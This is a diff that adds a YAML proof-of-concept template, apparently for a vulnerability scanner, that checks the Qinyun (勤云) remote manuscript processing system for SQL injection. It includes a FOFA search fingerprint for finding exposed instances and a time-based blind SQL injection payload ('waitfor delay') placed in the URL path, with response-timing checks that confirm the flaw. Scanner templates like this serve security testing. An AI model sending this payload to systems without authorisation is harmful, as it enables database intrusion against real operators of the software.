@@ -1,0 +1,17 @@
+id: poc-yaml-e-tiller-rmps-sqli
+info:
+  name: 勤云远程稿件处理系统 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 勤云远程稿件处理系统
+  fofa: body="北京勤云科技"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:{{.t1}}'--/article/abstract/1
+  expression: status_code == 302 && contains(body,"/404.htm") && contains(body,"抱歉，您找的文章信息不存在或已被删除")
+    && duration > t1 && duration < t2
+transport: http
